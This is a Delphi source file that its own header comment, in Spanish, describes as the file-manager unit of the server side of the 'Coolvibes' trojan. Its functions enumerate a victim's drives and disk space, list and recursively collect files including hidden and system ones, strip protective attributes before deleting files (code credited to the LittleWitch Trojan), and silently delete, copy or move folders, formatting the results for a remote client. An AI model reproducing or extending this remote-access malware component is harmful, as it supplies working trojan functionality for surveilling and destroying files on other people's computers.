{Unit perteneciente al server troyano Coolvibes que contiene todas las funciones
que son usadas en el FileManager o Explorador de Archivos}
unit UnitFileManager;

interface

uses
  SysUtils,
  Windows,
  ShellApi;

function GetDrives(var Espacio: Int64): string;
function GetDirectory(const strPath: string): string;
function BorrarArchivo(s: string): Boolean;
function BorrarCarpeta(DirName: string): Boolean;
function ArchivosDentroDeDirectorio(DirName: string): string; //Devuelve una lista de los archivos dentro de un directorio y dentro de sus subdirectorios
function CopiarCarpeta(oldPath, NewPath: string): Boolean;
function MoverCarpeta(oldPath, NewPath: string): Boolean;
function MoverArchivo(oldPath, NewPath: string): Boolean;

implementation

function GetDrives(var Espacio: Int64): string;
var
  pDrive: PChar;
  Nombre, Formato: array[0..MAX_PATH] of char;
  EspacioTotal, EspacioDisponible: Int64;
  MaxPath, Flags: DWord;
begin
  SetErrorMode(SEM_FAILCRITICALERRORS); //Evita que se muestren errores críticos
  Espacio := 0;
  GetMem(pDrive, 512);
  GetLogicalDriveStrings(512, pDrive); //llena el arreglo con las unidades
  while pDrive^ <> #0 do
    begin // mientras pDrive tenga algo...
      //Inicializamos los arrays a 0 para evitar que contengan basura
      FillChar(Nombre, SizeOf(Nombre), 0);
      FillChar(Formato, SizeOf(Formato), 0);
      EspacioDisponible := 0;
      EspacioTotal := 0;
      //Obtenemos el nombre y formato de disco
      GetVolumeInformation(pDrive, Nombre, SizeOf(Nombre), nil, MaxPath,
        Flags, Formato, SizeOf(Formato));
      if nombre = '' then
        nombre := ' ';
      //Espacio en disco
      GetDiskFreeSpaceEx(pDrive, EspacioDisponible, EspacioTotal, nil);
      Espacio := Espacio + EspacioTotal;
      Result := Result + pDrive + '|' + Nombre + '|' + IntToStr(EspacioDisponible) +
        '|' + IntToStr(EspacioTotal) + '|' + Formato + '|' +
        IntToStr(GetDriveType(pDrive)) + '|';
      Inc(pDrive, 4);
    end;
end;

// ------------
// GetDirectory
// ------------

function GetDirectory(const strPath: string): string;
//Retorna la lista de archivos y carpetas de StrPath
var
  strFile, strDirectory: string;
  Listado: TSearchRec;
  // shInfo:    TSHFileInfo;
  // sFileType: string;
  Atributos: string;
begin
  SetErrorMode(SEM_FAILCRITICALERRORS); //Evita que se muestren errores criticos
  if not DirectoryExists(StrPath) then
    begin
      if GetLastError() = 21 then //Error al acceder a la unidad
        Result := 'MSG|{59}'
      else
        Result := 'MSG|{58}';
      Exit;
    end;
  if FindFirst(strPath + '*.*', faAnyFile, Listado) = 0 then
    //Encuentra el primer archivo en StrPath
    begin
      repeat
        Atributos := '';
        if (Listado.Attr and faHidden) = faHidden then
          Atributos := Atributos + 'Oculto ';
        if (Listado.Attr and faSysFile) = faSysFile then
          Atributos := Atributos + 'Sistema ';
        if (Listado.Attr and faReadOnly) = faReadOnly then
          Atributos := Atributos + 'Lectura ';

        if (Listado.Attr and faDirectory) = faDirectory then //Si es una carpeta...
          begin
            if (Listado.Name <> '.') and (Listado.Name <> '..') then //no son ni . ni ..
              StrDirectory := StrDirectory + #2 + Listado.Name + ':' + Atributos + ':' +
                IntToStr(Listado.time) + '|';
            //Copie a la string de Carpetas #2Carpeta:Atributos:Fecha|#2Carpeta2:Atributos:Fecha|
          end
        else //Si no es una carpeta, es un archivo...
          begin
            {SHGetFileInfo(PChar(strPath + Listado.Name), 0, shInfo,
              SizeOf(shInfo), SHGFI_TYPENAME);
            sFileType := shInfo.szTypeName;   }
            StrFile := StrFile + Listado.Name + '|' + (IntToStr(Listado.Size)) + '|' +
              {  sFileType + }'-|' + Atributos + '|' + IntToStr(Listado.time) + '|';
            //Los archivos quedan en formato: Nombre|Tamaño|Tipo|Atributos|Fecha|
            //El cliente debe saber que si encuentra un archivo, debe extraer el tamaño, el tipo y la fecha
          end;
        Result := StrDirectory + StrFile;
        //y envie todas las carpetas primero y despues los archivos
      until FindNext(Listado) <> 0;
      SysUtils.FindClose(Listado);
    end
  else //Es decir, FindFirst(strPath+'*.*', faAnyFile, Listado) ES DIFERENTE de 0, osea que no hay archivos
    Result := '';
end;

function BorrarArchivo(s: string): Boolean;
//Esta función la escribió aXLiTo
//http://www.littlewitchtrojan.cjb.net/
//y fue sacada de el código fuente de LittleWitch Trojan
var
  i: Byte;
begin
  Result := False;
  if FileExists(s) then
    try
      //saco atributos para poder borrar un archivo sin importar que sea oculto, solo lectura o de sistema
      i := GetFileAttributes(PChar(s));
      i := i and $00000002; //faHidden;
      i := i and $00000001; //faReadOnly;
      i := i and $00000004; //faSysFile;
      SetFileAttributes(PChar(s), i);
      Result := DeleteFile(PChar(s));
    except
    end;
end;

function BorrarCarpeta(DirName: string): Boolean;
var
  SHFileOpStruct: TSHFileOpStruct;
  DirBuf: array[0..255] of char;
begin
  try
    Fillchar(SHFileOpStruct, SizeOf(SHFileOpStruct), 0);
    FillChar(DirBuf, SizeOf(DirBuf), 0);
    StrPCopy(DirBuf, DirName);
    with SHFileOpStruct do
      begin
        Wnd := 0;
        pFrom := @DirBuf;
        wFunc := FO_DELETE;
        fFlags := FOF_ALLOWUNDO;
        fFlags := fFlags or FOF_NOCONFIRMATION;
        fFlags := fFlags or FOF_SILENT;
      end;
    Result := (SHFileOperation(SHFileOpStruct) = 0);
  except
    Result := False;
  end;
end;

function CopiarCarpeta(oldPath, NewPath: string): Boolean;
var
  SHFileOpStruct: TSHFileOpStruct;
begin
  try
    Fillchar(SHFileOpStruct, SizeOf(SHFileOpStruct), 0);
    with SHFileOpStruct do
    begin
      pFrom  := PChar(oldPath + #0);
      pTo    := PChar(NewPath);
      wFunc  := FO_COPY;
      fFlags := FOF_FILESONLY or FOF_NOCONFIRMMKDIR or FOF_SILENT or FOF_ALLOWUNDO;
    end;
    Result := (SHFileOperation(SHFileOpStruct) = 0);
  except
    Result := false;
  end;
end;

function MoverCarpeta(oldPath, NewPath: string): Boolean;
var
  SHFileOpStruct: TSHFileOpStruct;
begin
  try
    Fillchar(SHFileOpStruct, SizeOf(SHFileOpStruct), 0);
    with SHFileOpStruct do
    begin
      pFrom  := PChar(oldPath + #0);
      pTo    := PChar(NewPath);
      wFunc  := FO_MOVE;
      fFlags := FOF_FILESONLY or FOF_NOCONFIRMMKDIR or FOF_SILENT or FOF_ALLOWUNDO;
    end;
    Result := (SHFileOperation(SHFileOpStruct) = 0);
  except
    Result := false;
  end;
end;

function MoverArchivo(oldPath, NewPath: string): Boolean;
begin
  if oldPath = NewPath then //Duh!
    Result := False
  else
    Result := RenameFile(OldPath, NewPath);
end;

function GetWinDir: string;
var
  WinDir: PChar;
begin
  WinDir := StrAlloc(MAX_PATH);
  GetWindowsDirectory(WinDir, MAX_PATH);
  Result := string(WinDir);
  if Result[Length(Result)] <> '\' then
    Result := Result + '\';
  StrDispose(WinDir);
end;

function GetSysDir: string;
var
  SysDir: PChar;
begin
  SysDir := StrAlloc(MAX_PATH);
  GetSystemDirectory(SysDir, MAX_PATH);
  Result := string(SysDir);
  if Result[Length(Result)] <> '\' then
    Result := Result + '\';
  StrDispose(SysDir);
end;

function ArchivosDentroDeDirectorio(DirName: string): string;
var
  strFile, strDirectory: string;
  Listado: TSearchRec;
  shInfo: TSHFileInfo;
  sFileType: string;
begin
  SetErrorMode(SEM_FAILCRITICALERRORS); //Evita que se muestren errores criticos
  if not DirectoryExists(Dirname) then
    begin
      Result := '';
      Exit;
    end;

  if FindFirst(Dirname + '*.*', faAnyFile, Listado) = 0 then
    begin
      repeat
        if (Listado.Attr and faDirectory) = faDirectory then //Si es una carpeta...
          begin
            if Copy(Listado.Name, 1, 1) <> '.' then //y no empieza por '.'...
              begin
                Result := ArchivosDentroDeDirectorio(Dirname + listado.Name + '\') + Result;
              end
          end
        else //Si no es una carpeta, es un archivo...
          begin
            Result := Dirname + Listado.Name + '|' + IntToStr(Listado.Size) + '|' + Result;
          end;
      until FindNext(Listado) <> 0;
      SysUtils.FindClose(Listado);
    end
  else
    Result := '';
end;

end.
